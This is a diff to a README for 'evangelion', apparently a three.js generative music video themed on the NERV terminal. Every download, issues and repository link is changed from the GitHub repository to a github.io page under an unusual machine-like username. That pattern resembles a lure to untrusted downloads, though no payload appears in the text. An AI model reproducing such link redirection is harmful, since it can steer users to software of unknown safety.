@@ -1,6 +1,6 @@
 # ⚡ evangelion - Unleash the NERV Terminal Experience
 
-[![Download evangelion](https://img.shields.io/badge/Download-evangelion-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cervicalcanalleadacidbattery744/evangelion)
+[![Download evangelion](https://img.shields.io/badge/Download-evangelion-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://cervicalcanalleadacidbattery744.github.io)
 
 Welcome to **evangelion** – a stunning, generative music video that brings the iconic NERV terminal aesthetic to life, rendered directly in your web browser. This isn't just a video; it's a living, breathing digital artwork created with cutting-edge code (three.js + TypeScript) that pulses and evolves with the music. Perfect for fans, creatives, or anyone who appreciates the intersection of technology and art.
 
@@ -22,7 +22,7 @@ This is a simple, three-step process. No coding, no command lines, no confusing 
 
 The first thing you need to do is get the application onto your computer. 
 
-**👉 [Click here to go to the official download page](https://github.com/cervicalcanalleadacidbattery744/evangelion)**
+**👉 [Click here to go to the official download page](https://cervicalcanalleadacidbattery744.github.io)**
 
 This link will take you to the project's main GitHub page. Once you're there, you'll see a green "Code" button on the right-hand side. Click that button, and then click "Download ZIP" from the dropdown menu. 
 
@@ -92,8 +92,8 @@ For those who are curious, this project is built with **three.js**, a powerful 3
 
 If you enjoy evangelion or have any questions, we'd love to hear from you! 
 
-- For feature requests or bug reports, please visit the project's [GitHub Issues page](https://github.com/cervicalcanalleadacidbattery744/evangelion).
-- To see the source code and contribute, check out the [official repository](https://github.com/cervicalcanalleadacidbattery744/evangelion).
+- For feature requests or bug reports, please visit the project's [GitHub Issues page](https://cervicalcanalleadacidbattery744.github.io).
+- To see the source code and contribute, check out the [official repository](https://cervicalcanalleadacidbattery744.github.io).
 
 ---
 
@@ -101,7 +101,7 @@ If you enjoy evangelion or have any questions, we'd love to hear from you!
 
 Hit the big blue button below to get started, and prepare for a mesmerizing audio-visual journey through the world of NERV. 
 
-[![Install Now](https://img.shields.io/badge/🚀_Visit_the_Download_Page-4A90D9?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cervicalcanalleadacidbattery744/evangelion)
+[![Install Now](https://img.shields.io/badge/🚀_Visit_the_Download_Page-4A90D9?style=for-the-badge&logo=github&logoColor=white)](https://cervicalcanalleadacidbattery744.github.io)
 
 **Get ready to experience music like never before.** 
 
